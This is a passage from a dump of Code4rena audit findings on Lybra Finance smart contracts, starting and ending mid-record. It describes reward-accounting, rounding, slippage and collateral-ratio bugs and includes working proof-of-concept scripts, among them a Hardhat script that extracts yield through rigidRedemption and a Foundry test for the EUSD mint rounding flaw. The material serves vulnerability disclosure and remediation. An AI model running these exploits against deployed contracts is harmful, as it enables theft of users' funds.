https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L227-L240 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/EUSDMiningIncentives.sol#L226-L242   # Vulnerability details  ## Impact Rewards in the synthetix derivative contracts (EUSDMinningIncentives.sol, ProtocolRewardsPool.sol and stakerRewardsV2Pool.sol) contract are initiated when the owner calls the notifyRewardAmount. This function calculates the reward rate per second and also records the start of the reward period. This has an edge case where rewards are not counted for the initial period of time until there is at least one participant.   ## Proof of Concept  Look at the code for the stakerrewardV2Pool.sol, and other files have somewhat similar logic too, derived from the synthetix:  ```solidity     function notifyRewardAmount(uint256 _amount) external onlyOwner updateReward(address(0)) {         if (block.timestamp >= finishAt) {             rewardRatio = _amount / duration;         } else {             uint256 remainingRewards = (finishAt - block.timestamp) * rewardRatio;             rewardRatio = (_amount + remainingRewards) / duration;         }          require(rewardRatio > 0, \"reward ratio = 0\");          finishAt = block.timestamp + duration;         updatedAt = block.timestamp;         emit NotifyRewardChanged(_amount, block.timestamp);     }      function _min(uint256 x, uint256 y) private pure returns (uint256) {         return x <= y ? x : y;     } } ``` The intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of BathTokens). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards and these rewards will be lost and stuck in the system.    This is a known vulnerability that have been covered before, The following reports can be used as a reference for the described issue:  [0xMacro Blog - Synthetix Vulnerability](https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/)  [Same vulnerability in y2k report](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93)  As described by the 0xmacro blogpost, this can play as following:  Let\u2019s consider that you have a StakingRewards contract with a reward duration of one month seconds (2592000):  Block N             Timestamp = X  You call notifyRewardAmount() with a reward of one month seconds (2592000) only. The intention is for a period of a month, 1 reward token per second should be distributed to stakers.  State :  rewardRate = 1  periodFinish = X +**2592000**  Block M          Timestamp = X + Y  Y time has passed, and the first staker stakes some amount:  1.stake() 2. updateReward rewardPerTokenStored = 0 lastUpdateTime = X + Y  Hence, for this staker, the clock has started from X+Y, and he or she will accumulate rewards from this point.  Please note, though, that the periodFinish is X + rewardsDuration, not X + Y + rewardsDuration. Therefore, the contract will only distribute rewards until X + rewardsDuration, losing  Y * rewardRate => Y * 1  inside of the contract, as rewardRate = 1 (if we consider the above example).  Now, if we consider delay(Y) to be 30 minutes, then:  Only 2592000-1800= 2590200 tokens will be distributed, and these 1800 tokens will remain unused in the contract until the next cycle of notifyRewardAmount().  Same issue was reported in the rubicon v2 contest on code4rena, that can be looked for more reference.  ## Tools Used Manual Review  ## Recommended Mitigation Steps A possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the notifyRewardAmount.   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/476", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-28"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/0xnacho-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/425", "labels": ["analysis-advanced", "grade-b", "satisfactory", "sponsor confirmed", "A-10"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/peanuts-Analysis.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/378", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-26"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/0xRobocop-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/295", "labels": ["analysis", "high quality report", "satisfactory", "sponsor confirmed"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/Bauchibred-Analysis.md)."}, {"title": "Lack of timelock on rigidRedemption, enables to steal yield from other users", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/290", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-15"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L232   # Vulnerability details  ## Impact The withdraw function of the LybraEUSDVaultBase vaults, uses a time softlock to prevent users from hopping in and out of the protocol, to gain access to the yield generated by other users and then leave right away (by charging a small percentage from the withdrawn amount). The same measure isn't applied to rigidRedemptions, which enable a user to withdraw most of the underlying assets at any time after deposit. This enables an user to deposit into the pool right before a rabase is about to happen, get access to the yield generated by other users and leave by calling rigidRedemption and withdraw on the tokens left by rigid redemption (the amount charged on the leftovers assets, can be outbalanced by the yield). Therefor a malicious user to get access to yield that they didn't generated, effectively stealing it from others. The amount that the user will get access to will vary based on the deposited amounts.  ## Proof of Concept This issue involves 3 function: `withdraw(address onBehalfOf, uint256 amount)` from the `LybraEUSDVaultBase` contract (https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L98) which internally calls `checkWithdrawal(address user, uint256 amount)`(https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L98) to check that 3 days has passed after deposit, and charges the user otherways: ``` withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000; ```  `rigidRedemption(address provider, uint256 eusdAmount)` from the `LybraEUSDVaultBase` contract (https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L232) which enables a user to withdraw the full borrowed amount getting back a 1:1 ratio of collateral (the rest will be left in the vault, and can be withdrawn) ``` * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH * Emits a `RigidRedemption` event. ```  `excessIncomeDistribution(uint256 stETHAmount)` from the `LybraStETHDepositVault` contract (https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L62) which enables anyone to buy the stETH, generated by lido to the vault (or by charging on withdraws and rigidRedemptions), for EUSD, allocating them to EUSD holders through rebasing  ``` * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism. * Emits a `LSDValueCaptured` event. ```  Scenario: Step0: users use the protocol as intended depositing stETH which will generate a yield Step1: Bob calls the rebase mechanism (excessIncomeDistribution) Step2: Alice sees the rebase and preceeds it with a deposit (either by frontruinng or by pure prediction, since stETH rebase happens daily at a fixed time) Step3: Right after Bob's rebase gets executed, Alice calls rigidRedemption (to repay the full debt) followed by withdraw (to get the difference out), getting most of the stETH back and some EUSD  Step4: Since the stETH charged by the withdraw function is left in the vault, if she wants, Alice can now call excessIncomeDistribution, to get the tokens back, using the EUSD recived by rebasing, and leaving with slightly more stETH and some EUSD, that she got for free, leaving 0 debts and 0 assets deposited, having left her tokens in the vault for a few seconds.  Here is an hardhat script that shows the scenario above in javascript (each step is highlighted in the comments, and it will print all the balances to the console). Before running it you'll have to install the `'@openzeppelin/test-helpers'` package:  ``` const {ethers} = require(\"hardhat\"); const {         constants,         expectRevert,     } = require('@openzeppelin/test-helpers');//questo va installato const { expect } = require(\"chai\"); async function main() {   this.accounts = await ethers.getSigners()         this.owner = this.accounts[0].address         console.log(\"Deployng contracts...\")         const goerliEndPoint = '0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23'         const goerliChainId = 10121          const oracle = await ethers.getContractFactory(\"mockChainlink\")         const stETH = await ethers.getContractFactory(\"stETHMock\")         const EUSDMock = await ethers.getContractFactory(\"EUSD\")         const configurator = await ethers.getContractFactory(\"Configurator\")         const LybraStETHDepositVault = await ethers.getContractFactory(\"LybraStETHDepositVault\")         const GovernanceTimelock = await ethers.getContractFactory(\"GovernanceTimelock\")         const EUSDMiningIncentives = await ethers.getContractFactory(\"EUSDMiningIncentives\")         const esLBRBoost = await ethers.getContractFactory(\"esLBRBoost\")         const LBR = await ethers.getContractFactory(\"LBR\")         const esLBR = await ethers.getContractFactory(\"esLBR\")         const PeUSDMainnet = await ethers.getContractFactory(\"PeUSDMainnet\")         const ProtocolRewardsPool = await ethers.getContractFactory(\"ProtocolRewardsPool\")         const mockCurvePool = await ethers.getContractFactory(\"mockCurve\")//         const mockUSDC = await ethers.getContractFactory(\"mockUSDC\")         const lbrOracleMock = await ethers.getContractFactory(\"mockLBRPriceOracle\")//                  this.oracle = await oracle.deploy()          this.lbrOracleMock = await lbrOracleMock.deploy()          this.stETHMock = await stETH.deploy()          this.GovernanceTimelock = await GovernanceTimelock.deploy(1,[this.owner],[this.owner],this.owner);           this.esLBRBoost = await esLBRBoost.deploy()          this.usdc = await mockUSDC.deploy()          this.mockCurvePool = await mockCurvePool.deploy()          this.configurator = await configurator.deploy(this.GovernanceTimelock.address, this.mockCurvePool.address)           this.LBR = await LBR.deploy(this.configurator.address, 8, goerliEndPoint)            this.esLBR = await esLBR.deploy(this.configurator.address)           this.EUSDMock = await EUSDMock.deploy(this.configurator.address)          await this.configurator.initToken(this.EUSDMock.address, constants.ZERO_ADDRESS)//          this.EUSDMiningIncentives = await EUSDMiningIncentives.deploy(this.configurator.address, this.esLBRBoost.address, this.oracle.address, this.lbrOracleMock.address)          this.ProtocolRewardsPool = await ProtocolRewardsPool.deploy(this.configurator.address)          this.stETHVault = await LybraStETHDepositVault.deploy(this.configurator.address, this.stETHMock.address, this.oracle.address)          this.PeUSDMainnet = await PeUSDMainnet.deploy(this.configurator.address, 8, goerliEndPoint)          await this.mockCurvePool.setToken(this.EUSDMock.address, this.usdc.address)         await this.configurator.setMintVault(this.stETHVault.address, true);         await this.configurator.setPremiumTradingEnabled(true);         await this.configurator.setMintVaultMaxSupply(this.stETHVault.address, ethers.utils.parseEther(\"10000000000\"));         await this.configurator.setBorrowApy(this.stETHVault.address, 200);         await this.configurator.setEUSDMiningIncentives(this.EUSDMiningIncentives.address)          await this.EUSDMiningIncentives.setToken(this.LBR.address, this.esLBR.address)         await this.ProtocolRewardsPool.setTokenAddress(this.esLBR.address, this.LBR.address, this.esLBRBoost.address);                ///////////////////////////////////////////POC////////////////////////////////////////////////////////////          //random users, mints stETH and deposits them (only 1 in the script for simplicity)         await stETHMock.connect(accounts[2]).submit(accounts[2].address, {value:ethers.utils.parseEther(\"1000\") });         await stETHMock.connect(accounts[2]).approve(this.stETHVault.address, ethers.constants.MaxUint256)         await stETHVault.connect(accounts[2]).depositAssetToMint(await stETHMock.balanceOf(accounts[2].address),ethers.utils.parseEther(\"10000\"));                 //time passes generathing stETH yield         await network.provider.send(\"evm_increaseTime\", [6500])         await network.provider.send(\"evm_mine\")          //user 3 balances before exploit          await stETHMock.connect(accounts[3]).submit(accounts[3].address, {value:ethers.utils.parseEther(\"100\") });         //timestamp         const blockNumBefore = await ethers.provider.getBlockNumber();         const blockBefore = await ethers.provider.getBlock(blockNumBefore);         const timestampBefore = blockBefore.timestamp;         console.log(\"Timestamp before the exploit: \" + timestampBefore)         //stETH balance         const sthETHBalanceBefore = await stETHMock.balanceOf(accounts[3].address)         console.log(\"sthETHBalance before the exploit: \" +sthETHBalanceBefore)         //EUSD shares         const EUSDSharesBefore = await this.EUSDMock.sharesOf(accounts[3].address)         console.log(\"EUSD shares before the exploit: \" + EUSDSharesBefore)         //EUSD balance          const EUSDBalanceBefore = await this.EUSDMock.balanceOf(accounts[3].address)         console.log(\"EUSD balance before the exploit: \" + EUSDBalanceBefore)         //Deposited assets         const depositedAssetBefore = await stETHVault.depositedAsset(accounts[3].address)         console.log(\"Deposited assets before the exploit: \" + depositedAssetBefore)         //Borrowed amount         const borrowedBefore = await stETHVault.getBorrowedOf(accounts[3].address)         console.log(\"Borrowed amount before the exploit: \" + borrowedBefore)          //right before somene calls the rebasde function (excessIncomeDistribution) user3 deposits into the vault         const depositedAmount = ethers.utils.parseEther(\"1.0\")         await stETHMock.connect(accounts[3]).approve(this.stETHVault.address, ethers.constants.MaxUint256)         await stETHVault.connect(accounts[3]).depositAssetToMint(depositedAmount,ethers.utils.parseEther(\"1000.0\"))          //someone call excessIncomeDistribution causing the rebase to distribute the yield to users         await stETHVault.connect(accounts[2]).excessIncomeDistribution(ethers.utils.parseEther(\"0.01\"))         console.log(\"Alice deposits before rebase and withdraws immediately after\")          //right after the rebase user3 redeems all the necessary tokens         await this.configurator.connect(accounts[3]).becomeRedemptionProvider(true)         await stETHVault.connect(accounts[3]).rigidRedemption(accounts[3].address, await stETHVault.getBorrowedOf(accounts[3].address))         await stETHVault.connect(accounts[3]).withdraw(accounts[3].address,await stETHVault.depositedAsset(accounts[3].address));         await stETHVault.connect(accounts[3]).excessIncomeDistribution(ethers.utils.parseEther(\"0.01\"))                  //user3 balances after exploit         //timestamp         const blockNumAfter = await ethers.provider.getBlockNumber();         const blockAfter = await ethers.provider.getBlock(blockNumAfter);         const timestampAfter = blockAfter.timestamp;         console.log(\"Timestamp after the exploit: \" + timestampAfter)         //stETH balance         const sthETHBalanceAfter = await stETHMock.balanceOf(accounts[3].address)         console.log(\"sthETH balance after the exploit: \" +sthETHBalanceAfter)         //EUSD shares         const EUSDSharesAfter = await this.EUSDMock.sharesOf(accounts[3].address)         console.log(\"EUSD shares after the exploit: \" + EUSDSharesAfter)         //EUSD balance          const EUSDBalanceAfter = await this.EUSDMock.balanceOf(accounts[3].address)         console.log(\"EUSD balance after the exploit: \" + EUSDBalanceAfter)         //Deposited assets         const depositedAssetAfter = await stETHVault.depositedAsset(accounts[3].address)         console.log(\"Deposited assets after the exploit: \" + depositedAssetAfter)         //Borrowed amount         const borrowedAfter = await stETHVault.getBorrowedOf(accounts[3].address)         console.log(\"Borrowed amount after the exploit: \" + borrowedAfter)          expect(sthETHBalanceAfter > sthETHBalanceBefore)  }  // We recommend this pattern to be able to use async/await everywhere // and properly handle errors. main().catch((error) => {   console.error(error);   process.exitCode = 1; }); ``` It will log the following content to the console: ``` Deployng contracts... Timestamp before the exploit: 1688138231 sthETHBalance before the exploit: 99999999999999999999 EUSD shares before the exploit: 0 EUSD balance before the exploit: 0 Deposited assets before the exploit: 0 Borrowed amount before the exploit: 0 Alice deposits before rebase and withdraws immediately after Timestamp after the exploit: 1688138238 sthETH balance after the exploit: 100000319476188886835 EUSD shares after the exploit: 320852235386255949 EUSD balance after the exploit: 321329019285990239 Deposited assets after the exploit: 0 Borrowed amount after the exploit: 0 ```  ## Recommended Mitigation Steps The same time lock logic that is applied to the withdraw function could be applied to rigidRedemption, making this type of interactions unprofitable.      ## Assessed type  Timing"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/260", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-34"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/RedTiger-Q.md)."}, {"title": "Volatile prices and lack of checks on `rigidRedemption()` can cause users to purchase stETH at unwanted prices", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/221", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-18"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168   # Vulnerability details  ## Impact Volatile prices can cause issue when users try to do [`rigidRedemption`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168)  ## Proof of Concept Volatile prices can cause slippage loss, when users use `rigidRedemption()`. This function takes PeUSD (stable coin) amount and converts it to WstETH/stETH (variable price). Unfortunately `rigidRedemption()` does not include `timestamp` or `minAmount` received , meaning this trade can be executed later in time and at a different price than user previously expected.  **Example:** - provider has 100 **wstETH** and **wstETH** price is 2000$ - user wants to buy 10 **wstETH** and has 20 000 in PeUSD, so he calls [`rigidRedemption`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168) - Now due to congestion on **ETH**, and volatile prices the transaction could remain stuck in the mempool for a long time - Finally the transaction gets executed, but now **wstETH **price is 2100$, not the original 2000$, so the user receives 9,52 **wstETH** instead of 10 (not counting fees)! ## Tools Used Manual Review  ## Recommended Mitigation Steps Because of this scenario and other like it, it is recommended to use some sort of slippage protection when users execute trades. ```jsx     function rigidRedemption(address provider, uint256 eusdAmount,uint256 minAmountReceived) external virtual {         depositedAsset[provider] -= collateralAmount;         totalDepositedAsset -= collateralAmount; +       require(minAmountReceived <= collateralAmount);         collateralAsset.transfer(msg.sender, collateralAmount);         emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);     } ```   ## Assessed type  MEV"}, {"title": "Users can grab free esLBR", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/156", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "high quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/ProtocolRewardsPool.sol#L135-L140   # Vulnerability details  ## Impact  The vulnerability allows users to obtain esLBR tokens without burning any LBR tokens when the amount being burned is small enough. This results in users acquiring free esLBR tokens, leading to direct theft ot funds.  ## Proof of Concept  ProtocolRewardPool's [grabEsLBR](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/ProtocolRewardsPool.sol#L135-L140) is used to purchase the accumulated amount of pre claimed lost esLBR in the contract using LBR.  ```solidity     function grabEsLBR(uint256 amount) external {         require(amount > 0, \"QMG\");         grabableAmount -= amount;         LBR.burn(msg.sender, (amount * grabFeeRatio) / 10000);         esLBR.mint(msg.sender, amount);     } ```  The [grabFeeRatio](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/ProtocolRewardsPool.sol#L41) has a default value of 3000, but can be [increased](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/ProtocolRewardsPool.sol#L58-L61) up to 8000.  ```solidity     function setGrabCost(uint256 _ratio) external onlyOwner {         require(_ratio <= 8000, \"BCE\");         grabFeeRatio = _ratio;     } ```  However, due to precision loss when performing calculations with small numbers, it is possible for users to burn 0 LBR tokens while still receiving the full `amount` of esLBR tokens. This happens when the result of `(amount * grabFeeRatio) / 10000` is rounded down to 0.  The vulnerability lies in the fact that users can exploit this precision loss to acquire esLBR tokens without paying the required LBR tokens.  Here's a coded PoC how that would happen:  https://github.com/bytes032/playground/blob/5fd99efe9fc4157f0a4c927c5c48288fa113242b/test/6_PurchaseOtherEarningsFlow.t.sol  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.19; import \"forge-std/Test.sol\"; import \"forge-std/console.sol\";  contract Test6 is Test {   function testGrabbableAmount() external {     uint256 x = 8000;     uint256 y = 10000;     console.log((1 wei * 3000) / y);   } }  ```    ## Tools Used  Manual review   ## Recommended Mitigation Steps  Implement a minimum threshold for the `amount` parameter in the `grabEsLBR` function to ensure that users cannot burn 0 LBR tokens while still receiving esLBR tokens. This threshold should be set considering the precision limitations of the calculations involved.  ```diff function grabEsLBR(uint256 amount) external { +    require(amount * grabFeeRatio) / 10000 > 0, \"Amount must be above the minimum threshold\");     // Rest of the function code } ```    ## Assessed type  Other"}, {"title": "`vaultBadCollateralRatio` and `vaultSafeCollateralRatio` does not fit together", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/108", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/configuration/LybraConfigurator.sol#L198 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/configuration/LybraConfigurator.sol#L126   # Vulnerability details  ## Impact The check for `vaultBadCollateralRatio` and `vaultSafeCollateralRatio` does not fit together. So, it can result in unexpected behavior and protocol insolvency.  ## Proof of Concept The `vaultBadCollateralRatio` can be set by DAO. https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/configuration/LybraConfigurator.sol#L126 There is a check indicating that: `require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, \"LNA\");` It means: `130% <= newRatio <= 150% && newRatio <= (vaultSafeCollateralRatio + 10%)` The last part of this check is incorrect `newRatio <= vaultSafeCollateralRatio[pool] + 1e19`.   For example, if `vaultSafeCollateralRatio = 140%`, then `vaultBadCollateralRatio` can be between 130% to 150% and passes all the checks above, which does not make sense at all. Because, suppose:  - `vaultSafeCollateralRatio = 140%`  - `vaultBadCollateralRatio = 150%`  - `(depositedAsset[Alice] * _assetPrice * 100) / borrowed[Alice] = 145%`  In this scenario, Alice can be liquidated, because it passes the liquidation check as it is under 150%: https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L157 Moreover, Alice can mint more eUSD, because it passes the check health condition as it is above 145%. https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L129 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L267 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L292  Please note that in `setSafeCollateralRatio`, for vault type **zero**, `vaultSafeCollateralRatio` must be higher than 160%. https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/configuration/LybraConfigurator.sol#L200 So, the check during `setBadCollateralRatio` will be simplified to: `130% <= newRatio <= 150% && newRatio <= (160% + 10%)` In this case, the last part of the check is redundant.  But for vault type **one**, this issue can results in insolvency of the protocol as the example above explained.  ## Tools Used  ## Recommended Mitigation Steps https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/configuration/LybraConfigurator.sol#L126C5-L130C6 Basically, we should have: `vaultSafeCollateralRatio[pool] - 1e19` instead of `vaultSafeCollateralRatio[pool] + 1e19` ``` function setBadCollateralRatio(address pool, uint256 newRatio) external onlyRole(DAO) {         require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] - 1e19, \"LNA\");         vaultBadCollateralRatio[pool] = newRatio;         emit SafeCollateralRatioChanged(pool, newRatio);     } ```      ## Assessed type  Math"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/107", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-29"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/HE1M-Q.md)."}, {"title": "EUSD.mint function wrong assumption of cases when calculated sharesAmount = 0", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/106", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-06"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L299-#L306 https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L414-#L418   # Vulnerability details  ## Impact - Mint function might calculate the sharesAmount incorrectly. - User can profit by manipulating the protocol to enjoy 1-1 share-eUSD ratio even when share prices  is super high.  ## Proof of Concept Currently, the function `EUSD.mint` calls function `EUSD.getSharesByMintedEUSD` to calculate the shares corresponding to the input eUSD amount: ```solidity function mint(address _recipient, uint256 _mintAmount) external onlyMintVault MintPaused returns (uint256 newTotalShares) {         require(_recipient != address(0), \"MINT_TO_THE_ZERO_ADDRESS\");          uint256 sharesAmount = getSharesByMintedEUSD(_mintAmount);         if (sharesAmount == 0) {             //EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1             sharesAmount = _mintAmount;         }         ... } function getSharesByMintedEUSD(uint256 _EUSDAmount) public view returns (uint256) {         uint256 totalMintedEUSD = _totalSupply;         if (totalMintedEUSD == 0) {             return 0;         } else {             return _EUSDAmount.mul(_totalShares).div(totalMintedEUSD);         } } ``` As you can see in the comment after `sharesAmount` is checked, `//EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1`. The code assumes that if `sharesAmount = 0`, then `totalSupply` must be 0 and the minted share should equal to input eUSD. However, that's not always the case.  Variable `sharesAmount` could be 0 if `totalShares *_EUSDAmount` < `totalMintedEUSD` because this is integer division. If that happens, the user will profit by calling mint with a small EUSD amount and enjoys 1-1 minting proportion (1 share for each eUSD). The reason this can happen is because `EUSD` support `burnShares` feature, which remove the share of a users but keep the `totalSupply` value.  For example: 1. At the start, Bob is minted 1e18 eUSD, he receives 1e18 shares 2. Bob call `burnShares` by `1e18-1`, after this, contract contains      1e18 eUSD and 1 share, which mean 1 share now worth 1e18 eUSD 3. If Alice calls `mint` with 1e18 eUSD, then she receives 1 share (since 1 share worth    1e18 eUSD) 4. However, if she then calls `mint` with 1e17 eUSD, she will receives 1e17 shares although     1 share now worth 1e18 eUSD. This happens because `1e17 * (totalShares = 2) / (totalMintedEUSD = 2e18)` = 0  Below is POC for the above example, I use foundry to run tests, create a folder named `test` and save this to a file named `eUSD.t.sol`, then run it using command:  `forge test --match-path test/eUSD.t.sol -vvvv`  ```solidity pragma solidity ^0.8.17;  import {Test, console2} from \"forge-std/Test.sol\"; import {Iconfigurator} from \"contracts/lybra/interfaces/Iconfigurator.sol\"; import {Configurator} from \"contracts/lybra/configuration/LybraConfigurator.sol\"; import {GovernanceTimelock} from \"contracts/lybra/governance/GovernanceTimeLock.sol\"; import {mockCurve} from \"contracts/mocks/mockCurve.sol\"; import {EUSD} from \"contracts/lybra/token/EUSD.sol\";  contract TestEUSD is Test {     address admin = address(0x1111);     address user1 = address(0x1);     address user2 = address(0x2);     address pool = address(0x3);      Configurator configurator;     GovernanceTimelock governanceTimeLock;     mockCurve curve;     EUSD eUSD;        function setUp() public{         // deploy curve         curve = new mockCurve();         // deploy governance time lock         address[] memory proposers = new address[](1);         proposers[0] = admin;          address[] memory executors = new address[](1);         executors[0] = admin;          governanceTimeLock = new GovernanceTimelock(1, proposers, executors, admin);         configurator = new Configurator(address(governanceTimeLock), address(curve));          eUSD = new EUSD(address(configurator));         // set mintVault to this address         vm.prank(admin);         configurator.setMintVault(address(this), true);     }      function testRoundingNotCheck() public {         // Mint some tokens for user1         eUSD.mint(user1, 1e18);          assertEq(eUSD.balanceOf(user1), 1e18);         assertEq(eUSD.totalSupply(), 1e18);          //         eUSD.burnShares(user1, 1e18-1);          assertEq(eUSD.getTotalShares(),1);         assertEq(eUSD.sharesOf(user1), 1);         assertEq(eUSD.totalSupply(), 1e18);          // After this, 1 shares worth 1e18 eUSDs         // If mintAmount = 1e18 -> receive  1 shares          eUSD.mint(user2, 1e18);         assertEq(eUSD.getTotalShares(), 2);         assertEq(eUSD.sharesOf(user2), 1);         assertEq(eUSD.totalSupply(), 2e18);          // However, if mintAmount = 1e17 -> receive 1e17 shares          eUSD.mint(user2, 1e17);          assertEq(eUSD.sharesOf(user2), 1 + 1e17);       }  } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps I recommend checking again in `EUSD.mint` function if `sharesAmount` is 0 and `totalSupply` is not 0, then exit the function without minting anything.            ## Assessed type  Math"}, {"title": "EUSDMintingIncentives `stakedOf` can potentially brick minting/burning of pools", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/105", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/EUSDMiningIncentives.sol#L136-L147   # Vulnerability details  ## Impact  As the number of pools increases, this can lead to an excessive amount of 